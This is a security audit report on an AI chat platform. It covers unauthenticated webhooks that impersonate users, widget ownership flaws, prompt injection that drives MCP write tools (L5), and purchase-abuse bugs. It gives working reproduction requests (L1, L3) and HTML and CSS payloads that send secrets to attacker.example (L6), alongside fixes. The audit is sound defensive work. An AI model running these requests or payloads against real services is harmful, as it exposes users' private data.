# Findings: llm-logic (LLM threats + business logic)

Commit a2e57b08. Paths relative to `backend/` unless they start with `frontend/`.

## 1. Entry points enumerated

Public (no session):
- `POST /api/v1/widget/{id}/message`, `GET .../history`, `GET .../files/{fileId}/download`, `GET .../rag/chunks/{chunkId}`, `POST .../upload`
- `GET|POST /api/v1/messages/stream` (widget visitor via `X-Widget-Id` + `X-Widget-Session`, guest via `guestSession`)
- `POST /api/v1/webhooks/email`, `POST /api/v1/webhooks/whatsapp`, `POST /api/v1/webhooks/telegram/{bot}`, `POST /api/v1/webhooks/saved-tasks/{token}`
- `POST /mcp` (anonymous: `initialize`, `ping`, `tools/list` only)
- `POST /api/v1/checkout/start`, `/checkout/claim`, `/stripe/webhook`, `/iap/apple/notifications`, `/iap/google/notifications`, `/auth/code-signup(/consume)`, `GET /subscription/plans`

Authenticated:
- `/v1/chat/completions`, `/v1/messages`, `/v1/models`, `/v1/embeddings`, `/v1/images/generations`, `/api/v1/messages-gateway/*`
- `/api/v1/iap/verify`, `/api/v1/subscription/*`, `/api/v1/prompts/*`, `/api/v1/freeapi/status`, `/api/v1/admin/freeapi/*`

Tool paths (all through `src/Service/Tool/Execution/ToolInvoker.php` + `src/Service/Tool/ToolExecutionGate.php`): gateway tool loops, chat loop (`src/Service/Chat/Loop/RegistryChatRunToolbox.php`, LOOP.ENABLED), document tool loop, task-plan runners (`src/Service/Multitask/Execution/Runner/*`), Synaplan-as-MCP-server (`src/Mcp/McpServerFactory.php`). Side-effecting: `mcp_action`, MCP write tools, custom HTTP tools, memory add, file ingest, mail/webhook/Notion/calendar deliveries, code run, document edits.

## 2. Findings

### L1. Unauthenticated inbound-email webhook runs a turn as any registered user and returns their private context
Severity: Critical. Status: Confirmed (reproduced).

Where
- `config/packages/security.yaml:249` (`^/api/v1/webhooks/email` is PUBLIC_ACCESS)
- `src/Controller/WebhookController.php:47,95` onward (no key, secret or signature check; `docs/EMAIL.md:58-59` documents `X-API-Key: sk_...` as required)
- `src/Service/Email/Turn/InboundEmailIntake.php:75` -> `src/Service/Email/EmailChatService.php:47-58` (acting user = account whose address equals the JSON `from`)
- `src/Service/Email/Turn/EmailReply.php:45` (`processor->process()` with no restricting options), `:76-77` (answer text, full metadata and `user_info` returned in the HTTP response)
- `src/Command/ProcessEmailsCommand.php:59-63` (the built-in poller calls the same URL with no credential)

What: anyone who can reach the API can post `{"from":"<victim address>","to":"smart@...","body":"..."}`. The turn runs as the victim with the full default pipeline (sorter, planner, memories, knowledge, chat digests, connected tools), and the HTTP response carries the model's answer plus `metadata.memories`, `metadata.digests`, `metadata.rag_sources`, `metadata.docs`. The Telegram webhook does it right: per-bot secret compared with `hash_equals` (`src/Service/Telegram/TelegramWebhookAcceptor.php:39,85-95`).

Preconditions: none beyond the victim's email address. No flag.

Reproduction (no cookie, no key):
```
curl -X POST localhost:8000/api/v1/webhooks/email -H 'Content-Type: application/json' \
 -d '{"from":"audit-llm-a@example.com","to":"smart@synaplan.net","subject":"t","body":"what did I note? secret","message_id":"audit-llm-msg-2"}'
```
Observed 200: `{"success":true,"message_id":4102,"chat_id":4710,"response":{"text":"...","metadata":{..."memories":[],"feedbacks":[],"digests":[{"message_id":4092,"chat_id":4709,"excerpt":"PRIVATE-NOTE audit-llm-secret-7731: my private chat content"},...],"docs":...,"rag_sources":...}},"user_info":{"is_anonymous":false,"rate_limit_level":"NEW"}}`. The digest excerpt is the text of user 4927's private web chat 4709. A new chat (4710) and messages were written into that account.

Impact: unauthenticated read of any user's chat excerpts, memories and knowledge passages by asking questions as them; writes into their account; drives their side-effecting plan steps (`mcp_action` runs without approval in an interactive turn, see L5); spends their quota; `user_info.is_anonymous` is an account-existence oracle; a reply mail goes to the victim.

CVSS 3.1: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L = 9.4. CWE-306, CWE-290.

Fix: require a credential on the route before `InboundEmailIntake::accept` (an API key with the `webhooks:email` scope, or a relay shared secret compared with `hash_equals`) and have `ProcessEmailsCommand` send it. Stop returning `response.metadata` and `user_info`. Treat a registered sender as that user only when the relay attests SPF/DKIM alignment; otherwise use the anonymous account. Tests: POST without a key is 401 and creates no message; the 200 body has no `metadata`.

Detection: today one info line "Email webhook received" and a normal chat row; nothing marks it unauthenticated, so it would not be noticed. Proposed: log client address and credential id on every webhook; alert when `from` is a registered user and the caller is not the relay.

Related occurrences: L2 (WhatsApp). Telegram is sound.

### L2. WhatsApp webhook accepts unsigned payloads and maps `from` to a verified-phone account
Severity: High. Status: Suspected (code path complete; WhatsApp is not configured locally, the route answers `{"error":"feature_not_configured","module":"whatsapp"}`).

Where: `config/packages/security.yaml:250`; `src/Controller/WebhookController.php:174-250` (no `X-Hub-Signature-256` check; no occurrence of `X-Hub-Signature` in `src/`); `:205` -> `src/Service/Email/EmailChatService.php:125-155`.

What: the GET verification uses the verify token, but the POST that carries messages is not authenticated. A forged payload with `from` = a user's verified number runs a turn as that user. The answer goes to the victim's phone and the HTTP response has status fields only, so this is integrity and cost, not direct read.

Preconditions: WhatsApp module configured; victim's verified phone number.
Reproduction: missing step is a configured WhatsApp module; then POST a Meta-shaped `entry[].changes[].value.messages[]` body with no signature.
Impact: attacker-authored turns as the victim (plan steps incl. `mcp_action`, memory poisoning, quota), unsolicited WhatsApp replies billed to the operator.
CVSS 3.1: AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L = 8.2. CWE-345.
Fix: verify `X-Hub-Signature-256` (HMAC-SHA256 of the raw body with the Meta app secret, `hash_equals`) before parsing; 401 otherwise. Test: unsigned POST is refused.
Detection: none today. Proposed: count and log signature failures.

### L3. Widget visitor acts as the widget owner: any owner chat, file, assistant and model by id
Severity: Critical. Status: Confirmed (reproduced: private chat read and private file downloaded, both without a session). Agent/draft and `modelId` abuse traced, not exercised.

Where
- `src/Service/Widget/Turn/WidgetTurnGate.php:77` (`chatId` from the body)
- `src/Service/Widget/Turn/WidgetConversation.php:113,142-146` (a new session adopts the visitor-supplied chat if it belongs to the owner), `:70` (`attachChat`)
- `src/Controller/WidgetPublicController.php:773-930` (`history` returns up to 50 messages of the session's chat), `:981-1002` (download allows any owner file attached in that chat)
- `src/Service/Chat/Stream/StreamCallerResolver.php:61-65,85-124` (`X-Widget-Id` + `X-Widget-Session` on the public stream route make the caller the owner `User`; no domain check on this path); `config/packages/security.yaml:225`
- `src/Service/Chat/Stream/StreamTurnPreparer.php` `loadChat` (~133-137) and `attachFiles` (~255): "belongs to caller user" = owner
- `src/Service/Chat/Stream/StreamRequestResolver.php` + `StreamAgentPinResolver.php` + `src/Service/Agent/AgentRuntimeResolver.php:52-97` (`agentId`, `draft` resolved against the owner, so drafts pass); `modelId` honoured for widget callers

What: ownership checks compare against the widget owner, who is the acting user for an anonymous visitor. The same files do it right elsewhere: visitor uploads are bound to the session (`WidgetConversation.php:207-227`), a guest may only use its own session's chat (`StreamTurnPreparer.php:143-150`), and a widget never honours a caller `ragGroupKey`.

Preconditions: an active widget (its id is public in the embed code). `allowedDomains` does not help: `src/Service/Widget/WidgetDomainGuard.php` reads `Origin`/`Referer`/`x-widget-host`, an empty list allows all, and the stream path does not call it.

Reproduction (no cookie):
1. Owner 4927 has private web chat 4709 and private file 364.
2. `POST /api/v1/widget/wdg_0579f734c4e81b98e27099ceef32a136/message {"sessionId":"<new>","text":"hi","chatId":4709}` -> SSE answer.
3. `GET /api/v1/widget/<id>/history?sessionId=<same>` -> messages include 4092 `PRIVATE-NOTE audit-llm-secret-7731: my private chat content` and 4093.
4. `GET /api/v1/messages/stream?message=...&chatId=4709&fileIds=364` with headers `X-Widget-Id`, `X-Widget-Session` -> "Processing 1 file(s)..."; owner's file 364 attached to message 4096 in the owner's chat.
5. `GET /api/v1/widget/<id>/files/364/download?sessionId=<session of step 2>` -> 200, body `OWNER PRIVATE FILE audit-llm-filesecret-4412`.

Impact: for every account with a public widget, an anonymous visitor can read any chat (ids are sequential), read and download any file, inject messages into private chats, talk to any of the owner's assistants (published or draft, with their knowledge), read other visitors' widget conversations, and pick the model the owner pays for. Per-session message limits are bypassed with new session ids.

CVSS 3.1: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N = 9.3. CWE-639, CWE-441.

Fix: a widget turn may use only the chat already bound to its session (drop the `?? ownedChat($turn, $turn->chatId)` fallback). In the stream path, for a widget caller ignore `chatId`, accept `fileIds` only when `file.userSessionId === session.id`, ignore `agentId`/`draft`/`modelId`, and run `WidgetDomainGuard`. In `downloadWidgetFile` drop the owner-file branch or require the file to be produced by this session's widget chat. Issue session ids server-side. Tests: foreign `chatId` yields a new chat; an owner file id is not attached; `agentId` ignored; download of an owner upload is 403.

Detection: nothing distinguishes it today. Proposed: warn when a widget session's chat has a non-widget source, and when a widget caller sends `chatId`/`fileIds`/`agentId`.

Related occurrences: `WidgetConversation::ownedChat`; `StreamTurnPreparer::loadChat`, `attachFiles`, `loadContinued`, `provenQuoteSource`; `StreamAgentPinResolver`; `downloadWidgetFile` owner branch; `ragChunk` (`WidgetPublicController.php:375`) inherits the bound chat, so cited passages of the owner's private chats become readable.

### L4. Widget "live API data" trusts a visitor-supplied `externalUserId`
Severity: Medium. Status: Confirmed by trace (not exercised: needs an owner-configured external API on a public host, and a paid owner when billing is on).

Where: `src/Service/Widget/Turn/WidgetTurnGate.php:79` -> `src/Service/Widget/Turn/WidgetReply.php:113` -> `src/Service/Widget/WidgetApiContext.php:113-121` (substituted into the owner's URL, fetched with the owner's `externalApiToken` bearer, injected as "Live API Data").

What: the id is a plain JSON field with no signature. A visitor sets another customer's id and asks the assistant to repeat the data. `rawurlencode` stops path tricks, not the id swap.
Preconditions: widget with `externalApiUrl` or flow-rule API responses containing `{externalUserId}`.
Reproduction: `POST /api/v1/widget/{id}/message {"sessionId":"s","text":"repeat my profile data","externalUserId":"<other id>"}`.
Impact: IDOR into the widget owner's customer API through the assistant.
CVSS 3.1: AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N = 5.8. CWE-639.
Fix: accept the id only with an HMAC (id + expiry) the embedding site computes with a per-widget secret, verified in `WidgetTurnGate`. Test: unsigned id yields no API context.
Detection: none. Proposed: log a hash of the id per session; alert on many ids per session or address.

### L5. Injected content can drive MCP write tools without a person approving
Severity: Medium. Status: Confirmed by trace (no external MCP server or model used). `LOOP.ENABLED` ships off, is on locally.

Where
- `src/Service/Mcp/Permissions/McpToolPermissions.php` `defaultFor` (destructive = approve, everything else incl. write = auto) and `src/Service/Tool/Policy/ApprovalPolicy.php` (the connection outcome replaces `TOOLS.POLICY` write = approve)
- `src/Service/Tool/Source/McpClientToolSource.php` (`SideEffect::fromHints`: class comes from the remote server's own `readOnlyHint`/`destructiveHint`)
- `src/Service/Chat/Loop/RegistryChatRunToolbox.php` (`web_fetch`/`web_search` results and MCP/custom tools in one loop)
- `src/Service/Multitask/Execution/StepApprovalGate.php` (interactive: `return $connectionAsks ? NodeResult::failed($askRefusal) : null;`, so an interactive plan never pauses); the planner sees attachment digest and history (`src/Service/Multitask/TaskPlanner.php`)

What: with approvals on and write policy "approve", a non-destructive MCP write still runs automatically, because an untouched connection defaults to auto and a server can label any tool read-only. Text from a fetched page, an attached document, an MCP result, or a forged L1/L2 message can therefore cause a write in a connected system. Right elsewhere: destructive calls ask, shared connections publish reads only, `McpActionRunner` checks server ownership (`findByIdAndUser`).
Preconditions: user has an MCP connection with write tools; chat loop or `mcp_action` plan steps enabled, or gateway MCP tools.
Impact: unapproved writes in the user's connected systems; exfiltration through a write tool's arguments.
CVSS 3.1: AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N = 4.7. CWE-862, CWE-1427.
Fix: default MCP write to approve; do not trust `readOnlyHint` from unknown servers; make an interactive plan step that writes wait for approval; require approval for any write in a run whose context already holds fetched or tool content.
Test: policy test "untouched connection, write tool, interactive -> Approve".
Detection: tool execution is logged without the approval state. Proposed: flag executions with no approval in a run that read untrusted content.

### L6. Model output can exfiltrate through raw HTML images and CSS URLs in the chat and widget renderer
Severity: Medium. Status: Confirmed at renderer level (ran the app's own `useMarkdown().render` in the browser on localhost:5173). Not shown end to end with a real model.

Where: `frontend/src/composables/useMarkdown.ts:84-112,172` (only Markdown `![]()` images are limited to same origin), `:268` (`img` allowed), `:306` (`src`, `style` allowed); used by `frontend/src/components/MessageText.vue:832,843` and `frontend/src/components/widgets/ChatWidget.vue:2254`. No app-wide Content-Security-Policy.

What: `<img src="https://attacker.example/c?d=SECRET" alt="x">` and `<span style="background:url(https://attacker.example/s?d=SECRET)">` come out unchanged, while `![md](https://attacker.example/...)` is correctly replaced by a fallback span.
Preconditions: the model is induced (web page, document, RAG chunk, MCP result) to emit such HTML; the user views the answer.
Impact: zero-click leak of conversation, memory or file content to a third-party host; visitor-authored HTML in a widget message also loads in the operator's view.
CVSS 3.1: AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N = 5.3. CWE-200, CWE-79.
Fix: DOMPurify hook applying `isTrustedImageSrc` to every `img[src]` and dropping `style` values with `url(`/`image-set(`; add a CSP with `img-src 'self' data: blob:`. Test: add the two inputs to the `useMarkdown` unit spec.
Detection: not visible server-side; a CSP report endpoint would show attempts.

### L7. Internal `tools:` prompts readable by any signed-in user
Severity: Low. Status: Confirmed (reproduced).

Where: `src/Controller/PromptController.php:765-790` (owner 0 skips the access check).
What: `GET /api/v1/prompts/372` as a NEW-level user returns `tools:chat_loop`; `/prompts/9` returns `tools:enhance`. The list endpoint hides them. Another user's prompt (id 38) is correctly refused.
Impact: operator-edited internal prompts are disclosed, which helps craft injections. Defaults are public in the repo.
CVSS 3.1: AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N = 4.3. CWE-200.
Fix: return 404 for owner-0 prompts whose topic starts with `tools:` unless the caller is admin; test for it.
Detection: access log only.

### B1. Apple IAP: a refunded purchase can be re-redeemed with the original signed transaction
Severity: Medium. Status: Confirmed (reproduced locally).

Where: `src/Service/Iap/AppleStoreKitVerifier.php` (`verifySignedTransaction`, `stateFromTransaction`: state only from fields inside the client-held JWS); `src/Service/Iap/MobilePurchaseService.php` `redeem` (no check of a stored refunded status); `config/services.yaml:1102-1109` (online checks never enabled).
What: after a refund the notification removes the tier, but the buyer still holds the JWS signed before it; posting it again yields ACTIVE. Google does it right: `src/Service/Iap/GooglePlayVerifier.php:58` re-reads state from the Play API.
Preconditions: authenticated user, Apple IAP configured, refunded purchase whose period has not ended.
Reproduction: (1) `POST /api/v1/iap/verify` with the JWS -> granted, PRO. (2) REFUND notification to `/api/v1/iap/apple/notifications` -> plan NEW, status refunded. (3) Step 1 repeated unchanged -> granted, PRO, active.
Impact: paid tier without payment for the rest of the period, repeatable.
CVSS 3.1: AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N = 4.3. CWE-294, CWE-672.
Fix: after the JWS verifies, ask the App Store Server API for current status; at minimum refuse a redeem whose stored status is refunded. Test: redeem, REFUND notification, redeem same JWS -> not granted.
Detection: one info line on redeem. Proposed: warn on a refunded -> active transition.

### B2. IAP redeem race: one receipt grants several accounts; an IAP tier never lapses on its own
Severity: Medium. Status: Confirmed (reproduced locally).

Where: `MobilePurchaseService.php` `assertReceiptNotOwnedByAnotherUser` then `applyEntitlement` (check-then-write, no lock, no unique constraint), `:196` (grant without expiry); `src/Repository/UserRepository.php:245-257`; `src/Entity/User.php:531-545`; `src/Service/Iap/IapEntitlement.php:36-39` (`accountBinding` never compared).
Right elsewhere: `UsageTopup::credit` (unique index), `PayFirstClaim::claimUnused`, `src/Repository/SignupCodeRepository.php:87-95` (conditional UPDATE), `PaidAccountCreator::settle` (lock).
Reproduction: two users post the same receipt concurrently -> both granted PRO; a later sequential attempt gets the ownership conflict, the earlier grants stay. A receipt past its expiry still projects PRO.
Impact: one subscription pays for N accounts; a missed expiry notification leaves a tier for good.
CVSS 3.1: AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N = 3.1 (rated Medium for business effect). CWE-362, CWE-367, CWE-613.
Fix: purchase id in its own table with a unique index inserted in the redeem transaction (or a lock per purchase id); compare `accountBinding`; give IAP grants an expiry the level projection enforces. Tests: two parallel redeems -> one grant; grant past its end projects to NEW.
Detection: none. Proposed: periodic query for purchase ids on more than one account.

### B3. Apple IAP: transaction not bound to this app's bundle id; `Xcode` environment disables signature checks with no production guard
Severity: Medium. Status: missing bundle check Confirmed in code and locally; abuse with a real Apple-signed receipt from another app Suspected (needs such a receipt).

Where: `vendor/hoels/app-store-server-library-php` `SignedDataVerifier.php:65-74` (transaction path checks environment only), `ChainVerifier.php:92-96` (Xcode/LocalTesting skip the chain); `AppleStoreKitVerifier.php` `toEntitlement` (no bundle id comparison), `environment()`; `.env.example:844` (variable name only).
Reproduction (local stack runs the Xcode environment): unsigned JWS with a foreign `bundleId` and a matching `productId` -> granted PRO; an unsigned notification to the public notifications route is applied too.
Impact: tier for the price of a cheap product in another app; on an install left in Xcode mode, free tier and forged revocations by anyone.
CVSS 3.1: 3.1 (bundle id, AC:H); AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N = 6.5 where Xcode mode is active. CWE-345, CWE-347, CWE-1188.
Fix: reject when the transaction's bundle id differs from the configured one; refuse Xcode/LocalTesting unless `APP_ENV` is dev or test. Tests for both.
Detection: none. Proposed: critical log at boot when Xcode mode is active outside dev.

## 3. Ruled out

LLM / tools
- Widget visitor uploads attached to a turn: bound to the session (`src/Service/Widget/Turn/WidgetConversation.php:207-227`).
- Widget RAG chunk endpoint: only chunks cited in the session's chat (`src/Controller/WidgetPublicController.php:375`); sound on its own, inherits L3.
- Widget RAG scope locked to `WIDGET:<id>`, caller `ragGroupKey` ignored (`StreamTurnPreparer::withRagGroupKey`); memories, web search and task plans off for widget turns (`src/Service/Multitask/TaskPlanExecutor.php:417`); widget/guest/agent/incognito excluded from the chat loop (`src/Service/Chat/Loop/ChatLoopGate.php`).
- Guest stream caller: only its own session's chat (`src/Service/Chat/Stream/StreamTurnPreparer.php:143-150`).
- Vector search: every query carries `user_id` or explicit owner scopes (`src/Service/RAG/VectorStorage/RagScopeFilter.php`); scopes from `src/Service/RAG/RagScopeResolver.php`.
- Passage by chunk id: `mayReadChunk` (`src/Service/RAG/VectorSearchService.php:511-551`).
- `read_document` / `knowledge_search` file ids: `fileAllowed` (`src/Service/RAG/KnowledgeSearchHelper.php:116-151`).
- Memory point ids namespaced `mem_{userId}_{id}`; searches filter by user.
- Synaplan MCP server: anonymous callers get `initialize`/`ping`/`tools/list` only (`src/Mcp/McpAnonymousAccess.php`); chat ownership checked (`src/Mcp/McpServerFactory.php:630-632,863`).
- `mcp_action` server id from a plan: `findByIdAndUser` in `src/Service/Multitask/Execution/Runner/McpActionRunner.php`, through `ToolInvoker`. Shared MCP connections are read-only.
- API-selected prompt: own or system only (`src/Service/Chat/Stream/StreamRequestResolver.php:249-273`). Other users' prompts 403 (tested).
- Markdown `![]()` images same-origin only (`frontend/src/composables/useMarkdown.ts:84-112`).
- Telegram webhook: per-bot secret, constant-time compare (`src/Service/Telegram/TelegramWebhookAcceptor.php:39,85-95`).

Gateway (no finding)
- `/v1/*` without a key: 401 (tested). Streaming abort still metered (`OpenAICompatibleController.php:484,584`, `MessagesApiController.php:325`). `n` ignored. Provider/base URL not client-supplied; gateway settings admin-only (`MessagesGatewayController.php:393,467,616`). Budget checked on each request (`OpenAiGatewayAdmission`, `MessagesGateway.php:182-192,282`). Unknown models not zero-cost (`MessagesModelResolver.php:19`). Own-key billing rules (`MessagesGateway.php:272-281,861-862`). Tool calls metered (`GatewayOwnedTools.php:204`, `OpenAiGatewayToolLoop.php:469`). Free-API key confined (`FreeApiGatewayGuard`, `ApiKeyScope::prefixScopes`).

Commerce
- Stripe webhook: `constructEvent` before any effect; missing signature 400, unset secret 503 (`StripeWebhookController::handleWebhook`).
- Top-up double credit (`UsageTopup::credit`/`confirmForUser`); checkout session ownership (`StripeCheckoutSessionGateway::retrieve`); client price mapped server-side; old subscription events handled.
- Pay-first: no sign-in to existing accounts (`PayFirstClaim::maySignIn`); account-creation lock; SEPA tier only when settled (`StripeEntitlement::isSettled`).
- Forwarded headers: `src/Service/Http/ClientAddress.php` honours them only behind a trusted hop; the local stack trusts none.
- Signup codes: conditional UPDATE (`SignupCodeRepository.php:87-95`) and `CodeSignup::consume` lock.
- Google RTDN: state re-read from the Play API (`GooglePlayVerifier.php:58,91`).

## 4. Hardening ideas

- One channel-identity rule: a public channel request never becomes a registered `User` without a verified credential; widget and guest callers get a principal that cannot own chats, files or assistants.
- Widget: server-issued session ids, per-address and per-widget limits, domain guard on the stream path; treat `allowedDomains` as UX only since it is header-based.
- Mark fetched pages, file text, RAG chunks and MCP results as untrusted data for the model, and record on the run that untrusted content was read.
- `QdrantVectorStorage.php:169` `findSimilar` uses the source chunk's vector without an owner check, and `:263` `findChunk` ignores the user id (callers check); check ownership in the storage layer.
- Gateway: reserve estimated cost at admission (parallel requests all pass the budget check); clamp client `max_tokens` (`OpenAiChatCompletionRequest.php:98`); record usage when a stream throws after partial output; filter `/v1/models` to selectable rows.
- IAP notification routes: rate limit, Pub/Sub token check, handle `linkedPurchaseToken`.
- Stripe: idempotency is a read-then-write cache; drop the `customer_email` fallback in `handleCheckoutCompleted`.
- New API keys carry `webhooks:*`, which is treated as full access (auth reviewer's area).
- `frontend/src/components/widgets/ChatWidget.vue` inserts `${block.language}` unescaped (XSS reviewer's area).
- RAG queries are written with `error_log`.

## 5. Coverage gaps

- No real model was available (local default is the test provider), so L5 and L6 are shown by policy and renderer behaviour, not by a model following injected text.
- WhatsApp (not configured), `/v1/messages` (disabled locally), pay-first and code signup (off locally), real Apple/Google receipts, Stripe flows: static only.
- Free-API key issuance (`POST /v1/free/keys`, proof of work, per-address limits) is not in this repository; only the client side is, and `security.yaml:84` declares the route public.
- Not reviewed in depth: saved-task webhook token flow and unattended runs, guest chat, Telegram/WhatsApp turn internals, plugin tools, Notion/Dropbox/M365 sync as injection sources, custom HTTP tool executor, document tool loop, memory-add and file-ingest executors, gateway admission for embeddings/images/audio/research, chat run cost limit and loop detection (flag off), admin level grants, subscription portal/cancel.
